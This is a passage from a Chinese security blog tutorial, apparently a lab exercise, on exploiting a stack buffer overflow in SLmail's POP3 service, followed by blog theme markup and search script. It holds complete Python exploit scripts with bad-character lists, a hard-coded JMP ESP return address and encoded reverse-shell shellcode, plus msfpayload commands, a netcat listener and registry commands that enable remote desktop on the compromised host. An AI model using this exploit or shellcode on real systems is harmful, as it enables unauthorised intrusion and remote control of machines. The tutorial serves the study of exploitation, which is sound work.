+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars = (</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0b\x0c\x0d\x0e\x0f\x00"</span></span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10"</span></span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20"</span></span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\4e\x4f\x40"</span></span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50"</span></span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60"</span></span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70"</span></span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80"</span></span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90"</span></span><br><span class="line"><span class="string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0"</span></span><br><span class="line"><span class="string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0"</span></span><br><span class="line"><span class="string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0"</span></span><br><span class="line"><span class="string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0"</span></span><br><span class="line"><span class="string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0"</span></span><br><span class="line"><span class="string">"\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0"</span></span><br><span class="line">)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2606</span> + <span class="string">'B'</span> * <span class="number">4</span> + badchars</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21611430.jpg" alt=""></p>
+</li>
+<li><p>这里我们可以发现ESP寄存器中没有内容了，然后follow in dump 查看具体位置，发现数据一直到0A的时候就异常了，然后修改脚本，删去0A，通过这种方法找到三个坏字符：0A 0D 00</p>
+</li>
+</ul>
+</li>
+<li><p>理论上这个时候就可以进行数据的重定项了，将EIP的内容改为ESP的地址，但实际上是ESP的地址是变化的，所以这样就没有办法做重定向，硬编码不可行，这里就需要变通思路：</p>
+<ul>
+<li><p>在内存中寻找地址固定的系统模块</p>
+</li>
+<li><p>在模块中寻找JMP ESP（内存地址固定不变）指令的地址跳转，再由该指令间接跳转到ESP，从而执行shellcode</p>
+</li>
+<li><p>mono.py脚本识别内存模块，搜索return address 是JMP ESP指令的模块</p>
+</li>
+<li><p>寻找无DEP、ALSR保护的内存地址</p>
+</li>
+<li><p>内存地址不含坏字符</p>
+</li>
+<li><p>配置好调试工具，启动mono脚本：<figure class="highlight plain"><figcaption><span>modules```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/86872565.jpg)</span><br><span class="line"></span><br><span class="line">  我们可以发现系统正在运行的模块都出现了，那么如何找到合适的模块呢，先介绍一下上面的参数</span><br><span class="line"></span><br><span class="line">  rebase（操作系统重启以后是否发生变化，如变化，则为true，否则为false）这里寻找false的</span><br><span class="line"></span><br><span class="line">  safeseh aslr nxcompat 是操作系统的安全机制，都选false,true的是带有保护机制的，内存地址都是随机的。</span><br><span class="line"></span><br><span class="line">  OS dll表示每个操作系统都有的这里都选为TRUE</span><br><span class="line"></span><br><span class="line">- 由于计算机内存中存储的是二进制，汇编指令肯定是无法查找的，所以通过工具将汇编指令转换成二进制：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/17531204.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们进行jmp esp的查找，由于调试工具数据是十六进制，所以需要以十六进制的形式进行查找：```! mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/28063784.jpg" alt=""></p>
+</li>
+<li><p>很遗憾，这个模块里面没有，换其他模块，然后就可以找到可利用的：<figure class="highlight plain"><figcaption><span>-s "\xff\xe4" -m slmfc.dll```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/37554586.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们双击第一个模块，然后以汇编指令显示就会发现FFES: jmp esp</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/52427619.jpg)</span><br><span class="line"></span><br><span class="line">- 在jmp esp指令这里设置断点：（主要是为了利用脚本向跳转的这里发送溢出的代码，验证是否正常可以跳转）</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/8694262.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们修改前面精确溢出的代码，溢出的四个字节改为这里设置断点的内存地址，也就是jmp esp ，在添加390个C，也就是说：当程序执行到这jmp esp的时候，跳到ESP寄存器，然后将390个C存入ESP中</span><br><span class="line"></span><br><span class="line">  - 首先我们可以看到jmp esp的地址为：5F 4A 35 8F</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/38278009.jpg)</span><br><span class="line"></span><br><span class="line">  - 然后我们在脚本里构造溢出的内容为这个地址，由于计算机读取数据和人读是相反的，所以要将地址反过来构造：</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    #!/usr/bin/python</span><br><span class="line">    import socket</span><br><span class="line"> </span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;C&apos; * 390</span><br><span class="line">    try:</span><br><span class="line">        print &quot;\nSending evil buffer...&quot;</span><br><span class="line">        s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">        data = s.recv(1024)</span><br><span class="line">        s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">        data = s.recv(1024)</span><br><span class="line">        s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">        print &quot;\nDone!&quot;</span><br><span class="line">    except:</span><br><span class="line">        print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>然后发送数据，查看EIP和ESP的内容：（发现确实跳转了，EIP的内容为跳转的地址，存储C也是在ESP中执行了，说明我们可以执行shellcode）</p>
+<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/73683041.jpg" alt=""></p>
+<p>按F7执行下一步，发现又跳转到EIP：</p>
+<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21013466.jpg" alt=""></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>现在解决了ESP的地址跳转问题，我们就可以进一步构造shellcode执行，进行系统的控制：</p>
+<ul>
+<li><p>生成shellcode</p>
+</li>
+<li><p>scratch  （可以用这个去自己写）</p>
+</li>
+<li><p>用msfpayload生成shellcode</p>
+<ul>
+<li><figure class="highlight plain"><figcaption><span>-l``` 查看所有的payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 C```  用反向连接的这个载荷，C表示的是C语言格式，但是生成以后我们发现存在坏字符，所以shellcode不能使用</span><br><span class="line"></span><br><span class="line">  - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;```   这里使用msfemcode对三个字符进行转义，R是保证msfemcode可以使用、</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/15011544.jpg)</span><br><span class="line"></span><br><span class="line">- 将shellcode加入代码中：</span><br><span class="line"></span><br><span class="line">  ```python</span><br><span class="line">  #!/usr/bin/python</span><br><span class="line">  import socket</span><br><span class="line"> </span><br><span class="line">  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">  shellcode = (</span><br><span class="line">  &quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7\x71\x2c&quot; +</span><br><span class="line">  &quot;\xc1\x83\xeb\xfc\xe2\xf4\x0b\x1b\xc7\x8c\x1f\x88\xd3\x3e\x08\x11&quot; +</span><br><span class="line">  &quot;\xa7\xad\xd3\x55\xa7\x84\xcb\xfa\x50\xc4\x8f\x70\xc3\x4a\xb8\x69&quot; +</span><br><span class="line">  &quot;\xa7\x9e\xd7\x70\xc7\x88\x7c\x45\xa7\xc0\x19\x40\xec\x58\x5b\xf5&quot; +</span><br><span class="line">  &quot;\xec\xb5\xf0\xb0\xe6\xcc\xf6\xb3\xc7\x35\xcc\x25\x08\xe9\x82\x94&quot; +</span><br><span class="line">  &quot;\xa7\x9e\xd3\x70\xc7\xa7\x7c\x7d\x67\x4a\xa8\x6d\x2d\x2a\xf4\x5d&quot; +</span><br><span class="line">  &quot;\xa7\x48\x9b\x55\x30\xa0\x34\x40\xf7\xa5\x7c\x32\x1c\x4a\xb7\x7d&quot; +</span><br><span class="line">  &quot;\xa7\xb1\xeb\xdc\xa7\x81\xff\x2f\x44\x4f\xb9\x7f\xc0\x91\x08\xa7&quot; +</span><br><span class="line">  &quot;\x4a\x92\x91\x19\x1f\xf3\x9f\x06\x5f\xf3\xa8\x25\xd3\x11\x9f\xba&quot; +</span><br><span class="line">  &quot;\xc1\x3d\xcc\x21\xd3\x17\xa8\xf8\xc9\xa7\x76\x9c\x24\xc3\xa2\x1b&quot; +</span><br><span class="line">  &quot;\x2e\x3e\x27\x19\xf5\xc8\x02\xdc\x7b\x3e\x21\x22\x7f\x92\xa4\x32&quot; +</span><br><span class="line">  &quot;\x7f\x82\xa4\x8e\xfc\xa9\x37\xd9\x43\x4d\x91\x19\x3d\x9d\x91\x22&quot; +</span><br><span class="line">  &quot;\xa5\x20\x62\x19\xc0\x38\x5d\x11\x7b\x3e\x21\x1b\x3c\x90\xa2\x8e&quot; +</span><br><span class="line">  &quot;\xfc\xa7\x9d\x15\x4a\xa9\x94\x1c\x46\x91\xae\x58\xe0\x48\x10\x1b&quot; +</span><br><span class="line">  &quot;\x68\x48\x15\x40\xec\x32\x5d\xe4\xa5\x3c\x09\x33\x01\x3f\xb5\x5d&quot; +</span><br><span class="line">  &quot;\xa1\xbb\xcf\xda\x87\x6a\x9f\x03\xd2\x72\xe1\x8e\x59\xe9\x08\xa7&quot; +</span><br><span class="line">  &quot;\x77\x96\xa5\x20\x7d\x90\x9d\x70\x7d\x90\xa2\x20\xd3\x11\x9f\xdc&quot; +</span><br><span class="line">  &quot;\xf5\xc4\x39\x22\xd3\x17\x9d\x8e\xd3\xf6\x08\xa1\x44\x26\x8e\xb7&quot; +</span><br><span class="line">  &quot;\x55\x3e\x82\x75\xd3\x17\x08\x06\xd0\x3e\x27\x19\xdc\x4b\xf3\x2e&quot; +</span><br><span class="line">  &quot;\x7f\x3e\x21\x8e\xfc\xc1&quot;)</span><br><span class="line">  buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;\x90&apos; * 8 +shellcode</span><br><span class="line">  try:                </span><br><span class="line">      #\x90表示的是汇编中的nop，就是不执行操作，保证shellcode的可用性，为了防止esp执行的时候把我的shellcode的前面几个字符忽略掉</span><br><span class="line">      print &quot;\nSending evil buffer...&quot;</span><br><span class="line">      s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">      print &quot;\nDone!&quot;</span><br><span class="line">  except:</span><br><span class="line">      print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>现在我们监听本地的4444端口，等待反向连接</p>
+<figure class="highlight plain"><figcaption><span>nc -vlp 4444```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 然后保证SLmail服务正常运行，发送数据，然后缓冲区溢出利用成功，拿到系统权限：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/34848509.jpg)</span><br><span class="line"></span><br><span class="line">  - 执行系统命令：</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21092299.jpg)</span><br><span class="line"></span><br><span class="line">  - 觉得命令行不舒服：改注册表，然后3389远程连接：</span><br><span class="line"></span><br><span class="line">    - ```tex</span><br><span class="line">      echo Windows Registry Editor Version 5.00&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      regedit /s 3389.reg</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p><code>rdesktop 192.168.111.137</code>  远程桌面连接。</p>
+<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-23/7906793.jpg" alt=""></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/安全/" rel="tag"><i class="fa fa-tag"></i> 安全</a>
+          
+            <a href="/tags/fuzzy/" rel="tag"><i class="fa fa-tag"></i> fuzzy</a>
+          
+            <a href="/tags/缓冲区溢出/" rel="tag"><i class="fa fa-tag"></i> 缓冲区溢出</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/05/基于TCP-IP的三层发现.md/" rel="next" title="主动信息收集——三层发现">
+                <i class="fa fa-chevron-left"></i> 主动信息收集——三层发现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/06/11/python沙盒逃逸/" rel="prev" title="python沙盒逃逸学习">
+                python沙盒逃逸学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="Demos" />
+            
+              <p class="site-author-name" itemprop="name">Demos</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/demossl" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:demosqq@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序的漏洞从哪里来："><span class="nav-number">1.</span> <span class="nav-text">程序的漏洞从哪里来：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何发现漏洞："><span class="nav-number">2.</span> <span class="nav-text">如何发现漏洞：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows缓冲区溢出"><span class="nav-number">3.</span> <span class="nav-text">Windows缓冲区溢出</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demos</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共14.8k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
